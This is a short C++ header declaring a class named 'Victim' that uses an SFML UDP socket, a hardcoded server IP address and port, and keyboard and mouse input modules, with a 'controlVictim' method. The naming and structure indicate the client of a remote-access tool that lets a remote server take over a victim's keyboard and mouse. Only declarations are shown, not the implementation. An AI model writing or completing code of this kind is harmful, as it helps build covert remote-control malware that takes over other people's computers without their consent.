#pragma once
#include <SFML/Network.hpp>
#include "Mlib/Util/util.hpp"
#include "Mlib/Io/keyboard.hpp"
#include "Mlib/Io/mouse.hpp"
#include <iostream>

#define SERVER_IP "2.235.241.210"
#define SERVER_PORT 2390

class Victim
{
public:
	Victim(sf::UdpSocket* s);
	int controlVictim();

private:
	bool isRunning = true;
	const Mlib::Vec2i screenSize = Mlib::displaySize();
	sf::UdpSocket* socket;
	bool keysStates[256];
};